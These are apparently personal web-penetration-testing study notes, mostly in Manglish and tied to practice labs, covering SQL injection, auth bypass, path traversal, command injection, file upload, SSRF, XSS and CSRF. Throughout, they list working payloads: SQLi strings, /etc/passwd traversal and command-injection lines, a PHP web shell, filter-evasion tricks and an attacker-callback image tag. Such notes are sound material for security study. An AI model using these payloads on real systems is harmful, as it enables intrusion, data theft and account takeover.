
### SQL I
1) namal session id il ninum athava {"username":josu"} ennath kandu pidichu enn vecho apol josu enath mati admin enn aki nokam.but avide vech nirtharuth athilum sql i patuon nokanam ie, {"username":"admin';sleep(10);"}
2) username=josu%password=admin' OR 1=1--    oru space um last itto (url encode it)
3) username=josu'+and+sleep(9)--+&password=foo itt test chythnok.ithakunilengil josu'+or+1=1--+&passwd=foo itt test chythnok
4) ?category=admin' OR 1=1-- (url encode chyumbol = sign encode chythum pine chyatheyum test chyth nokanam ok athayath 1=1 ile = ok)
5) epozhum sql i test chyan sleep(10) nokam eth parameter ilum test chyam ie
                                 username:a'; SLEEP pg_sleep(10);--
                                 password:foo
5) satharana nammal parameter value il aan injection chyuka but nauk parameter name il thane inject chyan patumonum nokam, ie, name=josu&password=foo ennath sql chyumbol -> name[0;--] or name[0; --]=josu.... ennaki noki test chyuka
6) oru karyam sredhikuka athayath ee name enna parameter name html il input elementile name enna attributinte value aan.allathe aa attribute alla ok.namuk direct browseril thane ee sql i test chyam.inspect element adich(login areayil) edit as html kodukuka enit athile `<input ....name="name[0; --]" size="....`
7) ==athayath burp ile parameter names(not value) okke html il varumbol oro elementinteyum attribute value aayirikum==
8) database il username,password mathramall pala karyangalum save chyth vechitundakum.so just login page il matharmalla.pala sthalangalilum namal sqli test chyanam.json web token chelapo server databse il aayirikum save chyth vechitundavuka.so namal kid polula parameter il sqli test chyam
9) username= 'OR'1  password= 'OR'1  enn koduth test chyth nok
10) username= admin' UNION SELECT "xyz" as password from admins where '1'='1    - hacker101 inte exploit aan.ith ingane thane username il kodukuka enit password=xyz enum kodukuka.karanam namal "xyz" enn kodukunund username il
11) username inte length kandupidikan -> `username=' or LENGTH(username)=§1§#&password=helo`  enn kodukuka enit intruder il onn muthal 15 vere numbers kodukuka.enit result il nokiyal or request il mathram length vere kanum.eth number il aano length vere kanunath athrem aan username.ithupole thane passwordum kandupidkam.NOTE: ivide # ittath ith maria db aayath kondan.slash means athin shesham ullathelam comment chyapedum ok
12) image oke upload chyumbol vere thane reethiyil aanalo request undavuka apol athile ------ in thot mukalil ulla sathanathil '--+ ittoke test chyanam
13) ellathilum -- enna comment ayirikanamenila support chyunath.chelapo ## enna comment aayirikum support cyuka ok
14) manual aayi sql chyumbol -> aadyam table name kandethanam.table namde kandethiyal next athil ethra columns und enn kandethanam.next oro column intem datatype ariyanam.ennal mathrame dump chyan patu.NOTE: namal eth parameter il aano test chyunath athil thane columns ithra enn undakum so athinanusarich mathrame namuk different aayitula table call chyan patu ok
15) ==NOTE: namal type chynath display il kanichal mathrame UNION based injection nadaku enn thonunu==
16) eth type database aanen kandupidichal athinte documentation il poyal namuk default aayitula table names um column names um kaanan patum.so ath vech namuk ethoke tables um aa tables il ethoke columns um unden manasilakam ok
17) BLIND SQLI test chyan -> parameter il  `' and 1=1--`  enn koduth test chyuka.like `cookie: tracking_id=hlsdkfjl'+and+1=1--; session=sldkf...` 1=1 epozhum true aayath kond site normal ayit thane pravarthkum.ini namal 1=1 ennath mati 1=0-- enn kodukuka enit site error vannal blind sqli und ennartham ok.so ithupole true or false question vech namuk users table undo undengil inna columns undo enoke choich manasilakam ok
18) Time-based sqli   ->  '+||+pg_sleep(9)--;   or '+||+sleep(9)--;   depending on the DB
19) NoSql i ->`login=josu2&password[$ne]=joseph%40michal.1&s or $gt itt nok`
20) `Google Dork : site:domian ext:php inurl:?id=`  Athayath .php extension undayirkanam.athpole url il id enna parameter aayrikanam undayirikendath.angane namuk enthengilum url kitum.so athvech sql,xss oke nokam ok
### Authentication:
1) login il username no valid enn kandal namuk username aadyam enumerate chyam karnam username valid aayite password check chyoo
2) chelapo username password invalid ennayirikum kanuka.apol username enumerate chyan intruder il add kodukuk[[XSS]]a password parameter il ethenlum kodukuka.ennit options tab il grep-extract il poi add click chyth aa statemetn select chyth ok koduth attack chyuka
3) korach attempt chymbo thane lock aayal chelapo ip aayirikum lock chyynath so x-forwaded-for: use chyth bruteforce chyuka
4) login il username valid aakumbol responnse nokanam.especially password inte lenth in anusarich time vethyasam undon nokuka.invalid aaya username vechum response nokuka ithinte okke difference vech namuk palathum chyan kazhinjekam
5) chila samayangalil burp resultil status,length onum kanikanamenila.so columns->response received,response completed tick chyth lenth nokuka.ok
6) chila samayangalil 3 bad attempt chythit nammal real aaya account vech login chyth pine aa same matte account vech 3 thavana attemp chythal account lock aakanamenila
7) normal buteforce chyumbol chara para attack nadakum.one by one aayi nadakan resourse pool il maximum concurrent set 1 enn kodukuka.
8) chila websites ip aayirikila aa valid aaya account thane lock aakum if aa accountil suspecious activities nadanal.so angane namuk valid aaya accounts kandetham.karanam valid aaya account mathrame website lock aaku
9) namal ayakuna username,password json aayi aan pokunathengil aa password manipulate chyuka.kore passwords itt nokuka
10) 2fA il aadyathe password adichit randamateh 2fa step skip chyan patunundo en nokanam
11) rand account aakuka enit onil password,2fa koduth keruka enit athinte main url save chyuka enit randamathe accountil password koduth kerit 2fa kodukand url mati kodukuka enit id=victim name koduth keran patuon nokuka
12) website 2fa il users ine engane verify chyune enn kandethanam.eg:cookie
13) 2fa yil otp adich lock aakumbol thirich veendum login chyan aan parayunathengil macros use chyth ath bypass chyan nokuka
14) macros oke use chyuna samauath concurrent request 1 koduth one by one aakam atacking-lab9
15) cookies il namude password use chyunundengil(encoded) nammuk mattu users inte password vech bruteforce chyth nokam-lab10
16) ella app ilum namuk account undakan kazhiyanamenila cookies oke analize chyan apol xss polula karyangal upayogich cookie edukuka enit ath analize chyuka.ok
17) password rest chyan website use chyuna logic manasilak nokuka
18) forgot passwordil oro fieldum nammal study chyanam ie,current password diifrerent ittit baki vere reethiyil idanam,current password valid itit mateth noki okke idanam apol varuna response study chyuka
19) login page il login chythal aa /post request il puthiya parameter kanichekam like ?act=login enn so athile usernmae=josu&password=josu ennath remove chyth send adich nokanam ok angane pala reethiyil nokanam
20) request il is-admin:true enna puthiya oru header use chyth test chyth nokuka apol chelapo admin aayi mariyekam
21) athupole x-forwarder-for:127.0.0.1 oke athinte koode koduth nokuka
22) nammude sessionid= cookie il aayirikum namude power enthanen set chyunath.athyath namal admin aano atho normal user anno ennath.sessionid= value eduthit decode chyth nokuka athava base64 encoded aanengil easy aayi.but first url decode chyandivarum enit aayirikam base64 decode chyendath.think and do
23) namal login page il aadyam username ilum passwordilum enthengilum oke iit send adichondirikuka enit korach attempt kahziyumbol block aakum enit ee request repeater il viduka enit namal x-forwarded-for: 3 polula header use chyth send adikuka.ip vechan namale block chyunathengil 403 forbidden varila
24) ini login formil username correct koduth password enthengilum koduth kore pravisham send chyth namal epol aan bl0ck/lockout aakunathen nokuka
25) repeater il valid aaya passwd adikumbol kituna same response time aano invalid aaya passwd adikumbozhum kitunath enn nokuka.ithine pati lab und
26) otp,password oke kurach pravisham adichit namal pinem home/login page ilek redirect oke aakunundnegil lab-9 nokiko(macros)
27) 



### Directory Traversal:
1) nammal website il ninum kituna ellam varunath /var/www/images or files (linux) il ninuman
2) ../  or  ..\ level up chyan use chyam
3) ../../../../../../ ...  ingane kore italum mathi root directory ilek poikolum 
4) burp il proxy->options->intercept server response tich ital namuk oro request intem response kitum
5) website il images okke kanumbo athinte location url eduth parameteril ithupole oke chyth nokuka chelap ayalo
6) chela samayangali ../../   idathe thane direct /etc/passwd it nokuka ok
7) ../ idunathin pakaram ....// itt nokuka.athava website input strip chyunundavam
8) / ithoke url encode double encode oke chyth nokanam
9)             /too/abc/etc/far/.../passwd
				/../../../../../../etc/passwd%00
				/etc//passwd
				/etc/ignore/../passwd
				/etc/passwd/....
ith itt test chyth nokanam

### OS Command Injection:
1) nammal enthengllum particular aaya karyam search chyth athin namuk result tharunidathelam namuk injection check chyam
2) website ne patiyo oke feedback kodukuna sthalathoke os injection nokam
3) ella parameter value in sheshavum |whoami  or ||whoami|| oke it test chyth nokanam
4) kore parameter undakumbol oron intem value kazhinjit just oru | koduth nokuka enit error varunundo en nokuka like .. productId=1|&storeId=2.angane oro parametrinum itu nokuka
5) blind os injection aan chyan patunathengil >(redirect) function upayogich ath website il thane oru file il akan patumo en nokanam
6)     ;   enna symbol ittum onnil kooduthal commands try chyam  ie, ip_adress:127.0.0.1;+cat+/etc/passwd.       athupole pala commands um try chyan like ...0.0.1;ls+/


### Business Logic Vulnerabilities
1) price parameteril negative sumbol oke it test chyth nokanam
2) quantity parameter il negative iti nokanam
3) rand product cartil ittit quantity negative aaki total prize korakan patunundon nokanam
4) product cart ilek vidumbol quantity parameter il ethra interger number patumen nokanam. athukoodathe cart ile total prize il interger overflow undon check chyanam
5) cart il mathramalla login form ilum letters ethra limit und enn nokanam.email il valiya string itt koduthin account undaki nokanam enit undakiya acountil keri email truncate akunundo en nokanam
6) account oke undakumbol rand email idan patumon nokuka athayath adyathe emal @ kodukuka enit randamathe email thudangunathin mumb . itt @ symbol kodukathe chyan patumo en nokuka
7) namal oru account undakumbol namal normal user aanalo but account undakit athil keri kazhinjit namude privilege kootuna reethiyil enthengilum update/change chyan patumon nokuka.athayath ivide @dontwannacry.com enna id ulavark admin priv und so first namal normal id koduth account aakit pinee ullil keri kazhinjit email @dontwannacry.com enn akan patumon nokanam
8) website tharuna oro messages um nammal nalapole sradhkanma.ie `If you work for DontWannaCry, please use your @dontwannacry.com email address` enn site il kanichu athinartham employees inte email id = somthing@dontwannacry.com ennakam
9) password reset il current password parameter angane thane remove chyth password matan patunundo en nokanam
10) website il namude role select chyuna (user/admin) option undengil athoke exploit chyan patumo en nokanam
11) chela site oke namuk free gift card oke tharum ath automate chyth kore gift card generate chyan patumo en nokanam (using macros)
12) nammal oro karyangal chyumbozhum puthiya cookie set aakunundon nokanam. enit aa cookiel ninum varuna response plaintext aayitano varunath en nokanam. karanam cookies oke encrypted formil aanalo undavuka.so cookie ulla message decrypt chythitan namuk response aayi varunath enan athinartham.apol aa ciphertext ine pati kooduthal padikan kazhinjekum
13) oru cookie in ninum varuna error message plain text il aanegil ath decrypt chyunund enan athinartham.apol mattu cookie il ulla content ee cookie kondpoi itt decrypt chyan patunundo en nokuka
14) nammal parameter il kodukuna value plain text il alla pokunath.ath encrypt chythitan transfering nadakunath.so aa encryption algorithm kandethiyal chelapo ethengilum reethiyil mattu parameter il ee same algorithm decrypt/encrypt oke chyanoke nokuka
15) Keys used to encrypt data transmitted via the client ithoke kandupidikan patumon nokuka
16) browser tharuna oro messagum note chyanam enit athil ninum oro logic undakanam

### Information disclosure:
1) information disclosure kandethunath mathramalla ath chyth athinte impact nokanam
2) /robots.txt and /sitemap.xml ith randum adichit nokanam apol pala info kitiyekam
3) database type, or server that the website is using, along with its version number ithoke disclose chyunundon nokanam
4) enthine version kanikunundengilum athinte known exploit undo en online il noknam
5) chela websites open source frameworks use chyunundakum.apol athine code eduth analise chyth exploit undakan nokuka
6) website ile muzhuvan comments kanan ->engagement tools->find comments kodukuka apol full comments crawl chyum
7) user profile/account page il oke sensitive informations undakumalo.so somehow nammal another user inte aacountilek keran patiyal aa info ike namuk kitum like IDOR
8) chela site il onenki adminum allengi aa site inte local ip(127.0.0.1) ini ninum varunavark mathrame admin aayi login chyan patoo.apol namuk namude ip maati 127.1 enna local ip aaki keran patumon nonkanam -lab-4
9) match and replace (burp) - namude athil enthengilum add koduthla pine namal ayakuna oro request ilum aa header add ayikolum
10) important aayi thonuna oro request ilum http type mati nokanam ivide GET ennath TRACE akiyapozhan admin peivilege engane kitunathen manasilayath-lab-4
11) most of the tim websites undakumbol ethrngilum version control system use chyum like git.By default, a Git project stores all of its version control data in a folder called .git.ith website prduction envoronmentil expose chythal problem aan.site il /.git enn adich nokuka kitiya kiti-lab-5

### Access control:
1) sensitive files oke petenn guess chyuna reethiyil ayirikila url il undavuka ennalum applicartion athinte url leak chythitundavam.eg:javascript code nokuka athil chelepo undakum if user admin= ivide oke sensitive file undakam
2) Some applications determine the user's access rights or role at login, and then store this information in a user-controllable location, such as a hidden field, cookie, or preset query string parameter
3) namal ayakuna post parameter value parameter aayano json aayano en nokanam. aa request repeater il iduka enit send adikuka responsil json aayit varuna result noki athile oro variable um request il manual aayi role change chyan patumon nokanam-lab4
4) Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as "X-Original-URL" and "X-Rewrite-URL"
5) athayath chela samayangalil backend  X-Original-URL  enn http header il ninum request process chythekam apol ee requestil namuk /admin enn koduth chelapo admin aayi keran kazhinjekum ie,  X-Original-URL : /admin 
6) GET / enna request il /ulla sthalath /?username=mattoru account name koduth nokukanam ok
7) chela user account in name,or incrementing number aayirikum id.so ath vech horizontal priv esc chyan patumon nokuka
8) chela site il parameter id kk predictable aaya value aayirikila.For example, instead of an incrementing number, an application might use globally unique identifiers (GUIDs) to identify users.so ee id nammal guess/predich oo chyth venam vere account aayi priv esc chyan.ee guess polum chyan patatha universal id site il evidengilum disclose chythitundavum like user profile,user iduna postinte avide usename koduthitundakum ath click,hover chyumbol aa userinte id kanichekam-lab8
9) site il mattu users inte name okke kanika samayam ath click,hover oke chyth url oke study chyuka-lab8
10) chela samayam id mati vere koduthal nere login pageilek redirect aakukaye ullo.but chyumbol burp il thane ith chyanam apol aa particular account inte enthengilum disclose chythitundavum-lab9
11) webapp oke athil nadakuna chat messages okke oru file il aaki aan save chyunath. so aa file retreive chyano,edit chyano oke nokanam ee idor vazhi ok-lab11
12) namal chela karyangal chyuna samayth are you sure? enna oru confirmation page okke kanarile.so angane ulla request eduth athile username= parameter allengil vere parameter oke unakum athoke mati nokanam chelapo authorization correct ilengilo. apo namuk idor pole oke chyan kazhinjekum
13) chela websites oke referer: header use chyth access identify chyum like /admin ennan referer engil permission kodukum onum nokathe.apol namal referer:https://portswigger/admin oke aaki nokuka.enit send adich nokuka
14) website il admin thane pala karyangal chyan patum aa ella karyangalum correct aayi authenticate chyathitunavanamenila.athukondan referer header polethe oke chythnokan paranjath

### File upload vulnerabilities:
1) extensions oke maati upload chyan patumon nokanam
2) <?php echo system($_GET['command']); ?> ,   
3)  <?php echo file_get_contents('/home/carlos/secret'); ?> polula php code oke try chyth nokanam.
4)  When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type application/x-www-form-url-encoded. This is fine for sending simple text like your name, address, and so on, but is not suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type multipart/form-data is the preferred approach. 
5)  One way that websites may attempt to validate file uploads is to check that this input-specific Content-Type: header matches an expected MIME type.google il nokiyal mathi oro file type inum varuna content-type header engane aanen so athinanusarich mati itt nokuka
6)  servers typically won't execute files unless they have been configured to do so -lab3
7) server ethanen kanan patiyal .htaccess polula configuration files oke use chyth puthiya rules oke aaki .php file in pakaram matenthengilum .shell oke aaki file upload chyan patumon nokanam - lab4
8) exploit.php ennath exploit.pHp ennoke aaki oke it noknam
9) multiple extension oke parikshikuka ->exploit.php.jpg
10) add trailing charecters ->exploit.php.
11) Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes.eg:  exploit%2Ephp
12) Add semicolons or URL-encoded null byte characters before the file extension.eg: exploit.asp;.jpg or exploit.asp%00.jpg
13) Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path. 
14) exploit.p.phphp inganem try chyth nokuka
15) null byte type oke test chyuk eg: filename="exploit.php%00.jpg" -lab5
16) content-type mathram nokunathin pakaram chela servers athile contents match chyunundon nokum.ipol images aanengil athinu dimensions undakum.ipol php file aanengil athin dimensions onum kanila angane pala reethiyil athile contents genuine aano en nokum
17) Similarly, certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes `FF D8 FF`. 
18) chela servers advanced aaya reethiyil validation nadathum athayath file original directory il upload chyunathin pakaram oru temperory file ilek mattum enit avide vech validation chyum.validation pass ayilengi remove chyum.so ee check cheyuna samayam kond malicious code run chyan patumon nokuka-lab7
19) file upload vulnerabilities check chyuna request il content-type: intruder il add chythit ulla ella type um worlist aayi koduth ethengilum accept chyunundon nokuka.

### Server-side request forgery:
1) oru server inte ullil ulla internal services umayitulla trust relation utlize chyuna paripadi aan ssrf
2) local machine il ninum varuna reqeust oke blind aayit trust chyunundengil ssrf undakum
3) url s upayogich aayirikum ingane internal service umayi communicate chyunath.apol aa url pala reethiyil modify chyth nokanam.like http://localhost ennoke koduth.ok
4) burp history il nokumbol ethoke request inte ullil url upayogich sathanagal retireve chyunu enn note chyanam
5) pala ip address vazhiyum internal services nod server communicate chyum.aa ip address oke note chyuka.enit aa same ip address range il matethengilum app/back-end system run chyunundon nokanam
6) chelapo namuk direct 127.0.0.1 enn kodukan kazhiyanamenil bqz of blacklisting.so 127.0.0.1, such as 2130706433, 017700000001, or 127.1. oke try chyth nokam
7) ip to decimal conversion enn googlil type chyth ip-127.0.0.1 ennath decimal okke aaki try chyanam.ingane blacklist oke bypass chyan patumon nokanam
8) You can use spoofed.burpcollaborator.net for this purpose. 
9) ip mathramalla /admin ile oro letters um ulr encode double encode oke chyth nokanam
10) request il url search oke undengil(ie stockapi=http://....) // in shesham username@ ,username#@ oke itt first host kodukuka enit eth host aanu parse chyunath enoke nokuka.
11) # symbol url,double url encode oke chyth try chyuka
12) oro language ilem parser pala reethiyil aanu parse chyuka.so randum moonum host oro bhagath aayi itt eth host aan fetch chyunath enn nokuka
13) epozhum url use chyanamenila.pakaram just path mathrame undaku enthengilum karyam server in internal service il ninum labhikan
14) ivide stockapi= il url/hostname ila just /path mathrame ulloo apol aa same page il next page enna button und so aa request eduth athile path parameter il vere oru site kodukumbol IDOR ullathayi kanam ie path=https://google.com enn adikumbol angot pokunund
15) IDOR vulnerability okke kitiyal ath vazhi ssrf undakan patumon try chyth nokanam
16) ssrf ilum blind type und.chela samayam full remote code execution vere blind ssrf vazhi nedam
17) Many server-side request forgery vulnerabilities are relatively easy to spot, because the application's normal traffic involves request parameters containing full URLs
18) OAST technique use chythan athikavum blind ssrf kandupidikaru
19) You can use the Burp Collaborator client to generate unique domain names, send these in payloads to the application, and monitor for any interaction with those domains. If an incoming HTTP request is observed coming from the application, then it is vulnerable to SSRF. 
20) ssrf test chyumbol ethoke parameter back-end umayi communicate chyuno aa parameter oke test chyanam.nerthe lab il oke stockapi= ena parameter il chythu ivide referer: head eril chyunu -lab6
21) referer header il ssrf undon enn nokunu lab-7 il.ith engane aan work aakunathenal referer headeril ninum serverin manasilakan patum user evide ninan ee link/request ilek vannathenn.so apol nammal aa referer header ile link maati namal control chyuna oru domain(collaborator client) koduthal chelapo server aa domainilek pokukayum check(ping) chyukayum chyumayirikum.angane bind vulnerability kandethanayekum.
22) collaborator everywhere enna oru burp extension und ath install chyth vekanam. enit namude target scope il add chyumbol automatic aayi fuzzing nadanolum-lab7
23) blind ssrf petern kandupidikan ethengilum http header(eg:referer:) il burp collaborator client id koduth(ie https://collabclientid) send adich nokuka-lab-7
24) blind vulnerability ulla request bruteforce oke chyumbol(ie ip range oke check chyynathoke...) result ile length il prathyakich oru difference undakilla karanam ath blind aanalo.enthengilum undengil ath namude oast il kanichal aayi athrathane-lab7
25) blind ssrf kandu pidikan bhayankara paad aan.but kandethiyal nalla pole enumerate chyanam.ie athinte ullile networking pati arinjirikanam ie ip range.pine guessing oke chyendivarum-lab7
26) NOTE: nammal burp collaborator vech nslookup,whoami angnae ulla enth command adichu even athile username vare kandethan kazhinjal athoke remote code execution thane aan ok-lab7
27) REMEMBEE: ssrf athupolulla vulnerability test chyumbol namal ineternal services (ip range) oke scan chyunath engane enal 192.168.0.$1$:8080 or 80 .enna formatil aan.karanam ip routers il internal services in kituna default ip aan 192.168.0.1/255 ath marakaruth-lab7
28) utube ile bugbounty report explained il parayunath ssrf satharana undakunath image/avatar angane ulla namal thane aayi upload chyuna sthalangalil aanenan.athum ee ssrf oke blind aayirikumenan parayunath.athukond thane attacker in onum kanan patila response.pine ullath satharana pole server thane url vazhi oron fetch chyunath namal exploit chyunath

### XSS :
1) You can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript
2) alert(); , print(); 
3) Most web applications use cookies for session handling.
4) ivide nammal stored xss chyumbol burp collaborator client use chyunu.karanam nammal ivide padikunathale apol real world pole vere oru user um vann nokila so athin aritficial aaya users site check chyunath pole collaborator act chyan vendi aan collaborator client use chyunath-lab2
5) nammal oru site il login chyuna samayath username,passwords undakum.so ath inspect chyuka apol athinte html attribute kanam name="username" athupole name="password" enn.
6) so namal login chyuka enit inspect element adichit console->poi document.username/password enn adichal kanan patum.
7) login chyathe adichal kanan patila.so stored xss chyumbol ithupole document.password en payload undakiyal victims inte password kanan patiyekum but password manager il passwords store chythitundakanam enne ulloo ok -lab-3
8) request ukalil puthiya oru header undaki athil xss test chyth nokuka like x-forwarded-for,x-forwarded-host: `a"><img src=1 onerror=alert(9)>` allengil ifrrame tage nokiko...
9) ithupole oro html attribute inum chelapo athintethaya document. undayekum note it 
10) oru legitimate aaya user in oru websie il enthoke chyan patumo athoke xss vechum chyam ie, make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin.
11) chela websites password ilathe thane email matan ulla option tharum ithinte koode xss undengil namuk users ine xss vazhi email matan patum ithine CSRF enn parayunu.
12) csrf vere thane oru vulnerability aan.csrf mathram ulla scenario il namuk anti-csrf token use chyth prevent chyam.but athil xss koode undegil ee anti-csrf token kond valiya prayojanamonum ila
13) form,comment post chyunath,login ingane user in input chyth send chyan patuna ellam inspect/view-source chyth nokanam.enit athinte oke action= (aa req engot pokunu) , athin csrf token undo ?undegil athinte value,...angne http code note chyanam -lab4
14) lab-4 il xss+csrf rand um ullathkondan work aayath.email change chyan passwd chodikathathkond csrf chyan pati.athupole blog comment il xss ullath kond combine chyth mattu users inte email change chyanula payload undaki
15) epozhum site il nadakuna /POST request inte processing nokuka.ie view-source adich eg: oru login,or changing password oke action="" ,athinte koode ulla http code cookie,csrf,session angae aa processinte start muthal end vere http code il ninum manasilkan patum so ath utilize chyth processing study chyuka
16) namal oru vulnerable code oru website ile comments section il itt post chythu enn vecho.ini oru legitimate user vann aa blog page edukumbol athile ella comments um kanum.why?bqz ellarum comment chythath aa serverile oru sthalath(database) store chythitan ullath.nammal aa specific blog edukumbol server athumayi badhapetta comments fetch chyth tharunu.angane fetch chyth tharumbol nammal type chytha commentum athil undakum apol athile malicious script run chyum ok
17) namuk search polula sthalath tags,attributes oke individual aayi thane test chyam with intruder.tage test chyumnol ->   <$tag$> enna reethiyil test chyanam.
18) tage test chythit attribute test chyunundengil space inte %20 ittit venam test chyan
19) attribute test chyumbol aadyam vulnerable tag,then %20 enit venam $attribute$=100 enn kodukanam.karanam attributes in some value undayirikumallo
20) svg tag enal athoru graphics aan.athayath namuk oru screen pole edukam.athil namuk enth animation anngane enthu venelum kodukam.ee svg kk width hieght oke set chythal athinanusarich screen valuthakum.but aadyam namal eth tags aan idan patunath enn intruder vazhi kandupidikanam.ok
21) search polula sthalangalil xss try chyumbol view-source koodi noki aa input engane aan athil add akunath enn nokanam.ath nokiyum namud payload correct aayi undakan patum
22) chela website il tags(ie <>) vech xss attack nadakila.angane undayal kuzhapam ila, karanam <> undegil mathramalla allatheyum xss chyan patum.ie eventhandler mathram vech namuk xss trigger chyan patum eg: "onmouseover="alert(1) OR 
" autofocus onfocus=alert(document.domain) x="
22) oro events intem feature noknam.ivide "onmouseover="alert(1) enn koduthal mouse vech hover chyanam ennale xss trigger aaku
23) website ukalil pala sthalathum enthengilum button click chyumbol enthengilum pop up oke chyuna feature undengil athil xss try chyanam.ie ipol comment post chyuna sthalath namude website add chyuna feature undakum apol namude comment save ayi kazhinj maroral namude username inte avide click chyumbol aa website ilek pokuna reethiyanengil website kodukunathin pakaram oru xss kodukuka apol href tag il website link in pakaram ee xss work aakum
24) nammal iduna input evidengilum store aavunengil ath evide engane store chyunu enn nokanam.ie if input href= il aanengil athil href="javascript:alert(1)" enn kodukan patumon okke nokanam ok.
25) canonical link tag ine pati theory->general il paranjitund
26) namal kodukuna innput html ilano atho javascripti code inte ullul aano evideyan pokunath enn nokanam
27) alphanumeric strings test chyth ie, abcd1234'    nokunath nallathayirikum
28) simple iframe test -->`xxx123 <iframe src='\\sc.edu'>` ith itt test chyuka.aavunundengil ith test chyuka-->`xxx123 <iframe src='\\sc.edu' style='position:absolute; top:0px; left:0px; width:1920px; height:1080px; border:0'>` try chyuka.note: url vendath kodukam ok
29) test <u>hello</u> itt test chyuka.pala samayanagalilum ingane ulla tags white list chyanamenilla <i>hello</i> italian bold underline ...
30) xss allengil enth check chyumbozhum inpect element eduth network open chyth chyumbol (athayath namuk oru image upload chyanam) request nadakunundo enn ariyanam athava oru request um nadakunathayi network il kanikunilengil ath client side il aan karyangal nadakunath enn manasilakam
31) -->  <noscript> <p title=" </noscript> <style onload=alert(document.domain)//"> *{/*all*/color/*all*/:/*all*/[#e84393](https://www.youtube.com/hashtag/e84393)/*all*/;} </style>           (ith url encodd,double encode oke chyth alert chyan patumon nokuka)
32) lab-14 il strings break chyth xss aakunath kanikunund nokiko
33) search il xss test chumbol josu'josu enn kodukuka apol single quote string terminate chyunundon nokanam athava terminate chyunundengil ' ittit payload kodukam
34) ivide lab-15 il namal single qoute itt terminate chyan nokumbol backslash \ itt ath escape chyan javascript nokunu apol nama payload il thane \ backslash itt thodangumbol ath escape chyan js in patunila so namal  -->\'-alert(1)//     enn payload koduth chyunu
35) chela websites namale restrict chyam ethoke characters aan namuk type chyan allowed enn so athinanusarich nammal chyanam like ->onerror=alert;throw 1
36) application single qoute block chyunengil ->  &apos;-alert(document.domain)-&apos;  ingnae try chyam ivide qoute html encode chythathan lab-16
37) xss search chyumbol josu'josu"<> inganeoke ulla symbols oke itt try chyanam
38) browser ile view page source il namuk dom based xss test chyan patila pakaram ispect element adichit avide aan test chyendath
39) reflected xss il namal oru karyam type chyunu enit search adikumbol ath page il reflect chyunu enit ath vech payload undakunu but DOM il namal type chyunath code il append chynu.athayath ivide img tag il append aakunund so namal xss payload aaki search chyumbol aa payload ee img tag il varun enit search kazhiyuna aa time il thane ee xss trigger aakum
40) ivide product inte location check chyuna sthalath moon option und london,paris.newyork ivide sredhikanam.athayath oro country click chyumbozhum js action nadakunund.so inspect element adich nokumbol aa moon county ide mukalil aayi name=storeid enn und so javsript ee storeid eduthitan oro karyangal chyunath. so njan paranjath ingane oro action namal browser il chyumbol athinanusarich js work aakunund.so js work engane chyunu ie,id=,name= ingane ullathoke check chyanam - lab19
41) namal enthengilum karyam browser il nokeet athayath search all ithupole check stock pole oke chyumbol namuk apol thane result kanikuanthoke DOM xss undon check chyanam
42) epozhum ithupolul actions browser il nadakumbol athinte js code nokunath nallathayirikum. ivide search il search chythit aa result kitiya page ile js code nokiyapozhan manasilayath search chytha item .innerHTML vazhi sanitise chununden 
43) html injection vech ssrf kandupidikan patuon nokanam.ie, `<img src="http://kali-ip:port">`  koduth save chyuka enit kalil poi -->nc -nvlp port koduth enter adikuka ok
44) <marquee>joseph michal</marquee>
45) `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
46) "onmouseover="alert(1)
47)  '-alert(document.domain)-'
48) ';alert(document.domain)//
49) `\'-alert(1)//`
50) http://foo?&apos;-alert(1)-&apos;
51) ${alert(1)}
52) # "><script>alert(3)</script>
53) ....edback?returnPath=javascript:alert(2)  (xss with open redirection)
54) <iframe sandbox="allow-forms" src="https://google.com"></iframe>
55) a fn to trigger xss :
!function(){  
‘use strict’;  
alert(onerror)//is null since the scope is still window  
}();
56) application angle bracket filter chyunaenil ex: > ith filter chyunangil inagne chythnok -> `<<sdf>script>alert(9)<<sf>/script>`  output ->`<script>alert(9)</script>`. in mate angle bracket aanengil reverse chythamathi ok
57) iframe vech xss trigger chyan -> `<img src=1 oNeRrOr=alert`1`>`

==============================================================

### CSRF:
1) The easiest way to construct a CSRF exploit is using the CSRF PoC generator in the burp suite
2) enthengilum actions nadakuna sthalangalil aan csrf chyuka like emailchange,passwordchange, money funding.
3) actions nadakanengil pala http requests serveril nadakum angane flow il nadakan session cookie aan use chyuka
4) koodathe unpredictable parameter/value undakanum padila.ie,email change chyuna samayath /POST req il last email=test@test.com  enn mathrame undakan padulu.allathe email paremeter il intekoode vere parameter undakan padila angaane undayal csrf work aakila. athayath email parameter inte koode oru csrf(contains a random number/string) enna oru parameter undayal athil oru value undakum so server aa value check chyum same allengil accept chyila
5) csrf enganeya deliver chyunathenal namude malicious script namal control chyuna oru web serveril host chyanam enit aa site victim ine kond visit chyikanam
6) csrf token ennath server side il generate chyuna oru token aan.ath client login chyuna samayathoke client in ayach kodukum html code ile oru hidden field il .so pineed client specific aaya task oke chyumbol server ee csrf token validate chyum
7) CSRF tokens can prevent CSRF attacks by making it impossible for an attacker to construct a fully valid HTTP request
8) Since the attacker cannot determine or predict the value of a user's CSRF token, they cannot construct a request with all the parameters that are necessary for the application to honor the request.
9) we should use a cryptographic strength pseudo-random number generator (PRNG), seeded with the timestamp when csrf token is created plus a static secret.
10) csrf token server ilek pokunath oru request parameter aayitan.athayath form okr submit chyumbol /POST request il etavum thaazhe aayi kanam
11) CSRF tokens should not be transmitted within cookies.
12) csrf um session cookie yum thamil epozhum linked aayirikanam.so ath check chyan namude csrf edth namude randamathe accountile csrf il replace chyth check chyuka.status200,302 ie, ok aakuvanengil csrf um session thamil link alla means ath csrf prone aan
13) server side il users inte session data oke store chyth vechirikunund avide aan ee generate chyapeta csrf inte copy ullath.so next time user oru request chyumbol athin validation require aanengil server ee session data check chyum ee csrf matching aano enn 
14) csrf token koodathe chela websites samesite cookie enna attribute um upayogikarund.ee sathanam session cookie ide koode aayitan kanuka
